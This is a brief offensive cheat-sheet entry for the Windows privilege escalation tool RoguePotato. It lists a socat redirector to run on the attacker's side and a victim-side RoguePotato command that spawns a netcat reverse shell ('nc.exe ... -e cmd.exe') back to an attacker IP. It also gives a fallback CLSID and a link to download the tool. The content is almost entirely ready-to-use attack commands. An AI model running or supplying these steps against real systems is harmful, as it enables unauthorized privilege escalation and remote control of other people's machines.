# Name
Rogue Potato

## Usage
```
#Requires SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege

#On Attacker:
socat tcp-listen:135,reuseaddr,fork tcp:<victim's IP>:9999

#On Victim:
.\RoguePotato.exe -r 172.16.1.30 -e "C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe" -l 9999
#If fails:
-c "{6d18ad12-bde3-4393-b311-099c346e6df9}"
```

## Source
https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
